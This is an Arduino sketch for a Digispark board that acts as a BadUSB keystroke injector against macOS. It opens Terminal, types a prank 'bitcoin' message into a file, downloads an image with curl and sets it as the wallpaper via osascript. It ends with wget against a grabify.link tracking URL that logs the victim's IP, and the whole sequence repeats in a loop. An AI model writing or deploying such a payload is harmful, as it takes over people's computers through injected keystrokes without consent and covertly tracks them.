#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_SPACE);
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("terminal");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cat > bitcoin.txt");
   DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(1000);
  DigiKeyboard.println("GIVE ME ALL YOUR BITCOINS, I AM A PRINCE FROM NIGERIA");
   DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, KEY_D);
   DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_Q);
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("rm bitcoin.txt");
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("curl https://i.pinimg.com/originals/e4/35/3b/e4353bb19408e54e46db34b19ca9404e.jpg > ~/Desktop/pickle.jpg");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/Users/Sumaita/Desktop/pickle.jpg \"' ");
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.println("wget -m https://grabify.link/track/KZRPHA");
  
  
}
